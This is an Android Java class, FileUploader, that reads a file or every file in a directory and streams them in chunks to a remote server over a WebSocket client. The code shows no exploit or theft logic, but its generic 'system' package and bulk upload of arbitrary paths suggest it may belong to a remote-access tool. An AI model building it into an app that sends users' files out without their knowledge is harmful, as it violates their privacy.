package com.xrc.system.network;

import android.content.Context;
import android.util.Log;

import com.xrc.system.core.Constants;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class FileUploader {
    private static final String TAG = Constants.TAG + ":Upload";
    private static final int CHUNK_SIZE = 32768;
    private final Context ctx;

    public FileUploader(Context ctx) {
        this.ctx = ctx.getApplicationContext();
    }

    public void uploadFile(String path) {
        File file = new File(path);
        if (!file.exists() || !file.canRead()) {
            Log.e(TAG, "File not readable: " + path);
            return;
        }

        long totalSize = file.length();
        int totalChunks = (int) Math.ceil((double) totalSize / CHUNK_SIZE);

        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] buffer = new byte[CHUNK_SIZE];
            int read;
            int index = 0;

            while ((read = fis.read(buffer)) != -1) {
                byte[] chunk = new byte[read];
                System.arraycopy(buffer, 0, chunk, 0, read);
                WebSocketClient.get(ctx).sendFileChunk(file.getName(), chunk, index, totalChunks);
                index++;
                Thread.sleep(50);
            }

            Log.i(TAG, "Upload complete: " + file.getName() + " (" + totalChunks + " chunks)");
        } catch (IOException e) {
            Log.e(TAG, "Upload IO error", e);
        } catch (InterruptedException e) {
            Log.e(TAG, "Upload interrupted", e);
            Thread.currentThread().interrupt();
        }
    }

    public void uploadDirectory(String dirPath) {
        File dir = new File(dirPath);
        if (!dir.isDirectory()) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isFile()) {
                uploadFile(f.getAbsolutePath());
            }
        }
    }
}
